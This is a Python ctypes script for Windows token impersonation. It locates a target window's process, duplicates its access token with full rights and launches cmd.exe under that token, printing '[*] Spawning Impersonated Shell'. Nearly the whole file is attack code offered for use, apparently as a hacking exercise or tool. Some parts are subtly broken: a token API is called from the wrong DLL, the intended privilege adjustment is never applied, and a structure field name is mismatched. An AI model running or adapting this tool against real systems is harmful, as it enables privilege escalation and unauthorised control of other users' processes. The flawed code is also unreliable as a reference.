from ctypes import *
from ctypes.wintypes import *
'''
FindWindowA
GetWindowsThreadProcessID
OpenProcess
OpenProcessToken // Open Process Token Of The Target We Want To Impersonate
                 // Open Process Token Of The Current Process Using GetCurrentProcessID, Open The Process and obtain OpenProcess Token
                 // Adjust The Current Privileges With The Privileges Of The Impersontated Process

###Impersontation Steps
GetCurrentProcessId //Current Process Must Have SEDebugPrivilege To Impersonate Token 
                    // Adjust Privileges on current process to SEDebugPrivilege
LookupPrivilegeValueW
PrivilegeCheck
AdjustTokenPrivilege
DuplicateTokenEx
CreateProcessWithTokenW
'''

# Access Rights
dwDesiredAccess = (0x000F0000 | 0x00100000 | 0xFFF)
bInheritHandle = None


# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)

# Privilege Enabled Mask
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_DISABLED = 0x00000000
# Needed Structures for used API Calls
class LUID(Structure):
    _fields_ = [
        ("LowPart", DWORD),
        ("HighPart", DWORD),
    ]


class LUID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", DWORD),
    ]


class PRIVILEGE_SET(Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Control", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES),
    ]


class TOKEN_PRIVILEGES(Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES),
    ]


class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ("nLength", DWORD),
        ("lpSecurityDescriptor", HANDLE),
        ("nInheritHandle", BOOL),
    ]


class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", DWORD),
        ("lpReserved", LPWSTR),
        ("lpDesktop", LPWSTR),
        ("lpTitle", LPWSTR),
        ("dwX", DWORD),
        ("dxY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", LPBYTE),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE),
    ]


class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD),
    ]


user32 = WinDLL("User32.dll")
kernel32 = WinDLL("Kernel32.dll")
advapi = WinDLL("Advapi32.dll")
def FindWindowA():
    fWindow = user32.FindWindowA(None, c_char_p(input('Enter Window Name To Impersonate: ').encode('utf-8')))
    if fWindow == 0:
        print('Error Code {} Occurred'.format(kernel32.GetLastError()))
    else:
        print('[*] Got Handle')
        return fWindow

def GetWindowsThreadProcessID():
    handle = FindWindowA()
    lpdwProcessId = c_ulong()
    getWinID = user32.GetWindowThreadProcessId(handle, byref(lpdwProcessId))
    if lpdwProcessId == 0:
        print('[*] Error Code {} Occurred'.format(kernel32.GetLastError()))
    else:
        return lpdwProcessId

def OpenProcess(pid):
    hProcess = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, pid)
    if hProcess == 0:
        print('Error Code {} Occurred'.format(kernel32.GetLastError()))
    return hProcess

def OpenProcToken():
    '''
      BOOL OpenProcessToken(
      HANDLE  ProcessHandle,
      DWORD   DesiredAccess,
      PHANDLE TokenHandle
    );
    '''
    targetProcess = GetWindowsThreadProcessID()
    CurrentProcess = kernel32.GetCurrentProcessId()
    tProc = OpenProcess(targetProcess)
    cProc = OpenProcess(CurrentProcess)
    DesiredAccess = TOKEN_ALL_ACCESS
    TargetHandle = c_void_p()
    target_token = kernel32.OpenProcessToken(tProc, DesiredAccess, byref(TargetHandle))
    CurrentHandle = c_void_p()
    current_token = kernel32.OpenProcessToken(cProc, DesiredAccess, byref(CurrentHandle))
    if target_token == 0:
        print('[*] Error {} Occurred'.format(kernel32.GetLastError()))
    else:
        print('[*] Got Target Privileged Handle')
    return TargetHandle, CurrentHandle

def Impersontation():
    targetToken, currentToken = OpenProcToken()
    '''
       BOOL LookupPrivilegeValueW(
      LPCWSTR lpSystemName,
      LPCWSTR lpName,
      PLUID   lpLuid
    );
    '''
    requiredPrivileges = PRIVILEGE_SET()
    requiredPrivileges.PrivilegeCount = 1  # We are only looking at 1 Privilege at a time here
    requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES()  # Setup a new LUID_AND_ATTRIBUTES
    requiredPrivileges.Privileges.Luid = LUID()  # Setup a New LUID inside of the LUID_AND_ATTRIBUTES structure
    lpSystemName = None
    lpName = "SEDebugPrivilege"
    lpLuid = LUID()
    LookupPrivileges = advapi.LookupPrivilegeValueW(lpSystemName, lpName, byref(lpLuid))
    if LookupPrivileges == 0:
        print('[*] Error Code {} Occurred'.format(kernel32.GetLastError()))
    else:
        print('[*] We Found The LUID')

    pfResult = c_long()
    PrivilegeCheck = advapi.PrivilegeCheck(currentToken, byref(requiredPrivileges), byref(pfResult))
    if PrivilegeCheck == 0:
        print('Error Occurred {}'.format(kernel32.GetLastError()))
    else:
        print('[*] Privilege {} Found'.format(lpName))
        print('[*] Enabling Privilege')
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED

    # Duplicate Token On Hooked Process
    hExistingToken = c_void_p()
    dwDesiredAccess = TOKEN_ALL_ACCESS
    lpTokenAttributes = SECURITY_ATTRIBUTES()
    ImpersonationLevel = 2  # Set to SecurityImpersonation enum
    TokenType = 1  # Set to Token_Type enum as Primary

    # Configure the SECURITY_ATTRIBUTES Structure
    lpTokenAttributes.bInheritHandle = False
    lpTokenAttributes.lpSecurityDescriptor = c_void_p()
    lpTokenAttributes.nLength = sizeof(lpTokenAttributes)

    # Issue the Token Duplication Call
    duplicate = advapi.DuplicateTokenEx(targetToken, dwDesiredAccess, byref(lpTokenAttributes), ImpersonationLevel, TokenType, byref(hExistingToken))
    if duplicate == 0:
        print('Error Code Occurred {}'.format(kernel32.GetLastError()))
    else:
        print("[*] Duplicating Token on Target Process...")
    hToken = hExistingToken
    dwLogonFlags = 0x00000001
    lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
    lpCommandLine =  "C:\\Windows\\System32\\cmd.exe"
    dwCreationFlags = 0x00000010
    lpEnvironment = c_void_p()
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpProcessInformation = PROCESS_INFORMATION()

    # Configure Startup Info
    lpStartupInfo.wShowWindow = 0x1  # We want the window to show
    lpStartupInfo.dwFlags = 0x1  # Use to flag to look at wShowWindow
    lpStartupInfo.cb = sizeof(lpStartupInfo)

    execute = advapi.CreateProcessWithTokenW(
        hToken,
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        byref(lpStartupInfo),
        byref(lpProcessInformation))

    if execute == 0:
        print('Error Code Occurred {}'.format(kernel32.GetLastError()))
    else:
        print('[*] Spawning Impersonated Shell')

Impersontation()